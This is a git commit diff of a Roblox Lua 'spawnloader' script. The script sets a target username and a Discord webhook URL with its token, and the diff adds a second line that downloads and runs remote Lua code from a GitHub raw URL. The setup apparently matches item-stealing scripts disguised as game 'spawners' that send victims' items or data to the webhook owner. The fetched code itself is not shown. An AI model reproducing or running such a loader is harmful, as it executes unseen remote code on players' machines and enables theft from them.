7250d45ab05080f2893987ee0ce3ea6292c36fff
Ezjq <kokieunz@gmail.com>
2024-11-11 15:32:07 +0800

    Update spawnloader.lua

--- spawnloader.lua
+++ spawnloader.lua
@@ -2,3 +2,5 @@ Username = "givepetroblox" --// Username
 Webhook = "https://discord.com/api/webhooks/1305433436755853314/b7HCdbAdCh0YRkjjKX0iZfduUKJyW2YCO7uMd7weCXri4NQzFvJSS6bS2kaEwOxMOo7s" --// Webhook
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezjpq/mm2/refs/heads/main/testo.lua"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezjpq/Testo/refs/heads/main/Testo.lua"))()
